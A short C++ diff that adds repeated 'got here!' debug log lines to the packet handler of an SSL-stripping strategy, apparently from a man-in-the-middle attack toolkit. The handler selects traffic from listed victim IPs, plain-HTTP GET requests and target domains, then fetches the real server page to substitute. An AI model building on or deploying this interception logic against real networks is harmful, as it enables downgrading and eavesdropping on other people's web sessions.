@@ -210,18 +210,21 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
     void * /*cookie*/) {
     const pcpp::Packet parsedPacket(packet);
+    LOG_INFO("got here!");
 
     // Check IPv4 layer
     auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
     if (ipLayer == nullptr) {
         return;
     }
+    LOG_INFO("got here!");
 
     // Check if source IP matches some victim IP
     if (std::find(victimIps_.begin(), victimIps_.end(),
                   ipLayer->getSrcIPAddress().toString()) == victimIps_.end()) {
         return;
     }
+    LOG_INFO("got here!");
 
     // Check TCP layer
     auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
@@ -229,6 +232,7 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
         return;
     }
+    LOG_INFO("got here!");
 
     // Access HTTP Layer
     auto *httpRequestLayer =
@@ -236,23 +240,27 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
     if (httpRequestLayer == nullptr) {
         return;
     }
+    LOG_INFO("got here!");
 
     // Check if method is GET
     if (httpRequestLayer->getFirstLine()->getMethod() !=
         pcpp::HttpRequestLayer::HttpGET) {
         return;
     }
+    LOG_INFO("got here!");
 
     // Check Host header
     pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
     if (hostField == nullptr) {
         return;
     }
+    LOG_INFO("got here!");
 
     // Check whether domain is in Host header and start SSL attack if so
     const std::string hostValue = hostField->getFieldValue();
     for (const std::string &domain : domainsToStrip_) {
         if (hostValue.find(domain) != std::string::npos) {
+            LOG_INFO("got here!");
             auto &httpMessageData = getHttpMessageData();
             LOG_INFO("Connecting to " + domain + "...");
             std::optional<std::string> realHtmlFromServer =
@@ -269,6 +277,7 @@ void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
                 httpMessageData.httpMessages.emplace(
                     realHtmlFromServer.value() + "\n");
             }
+            LOG_INFO("got here!");
             httpMessageData.httpMessagesCV.notify_one();
         }
     }
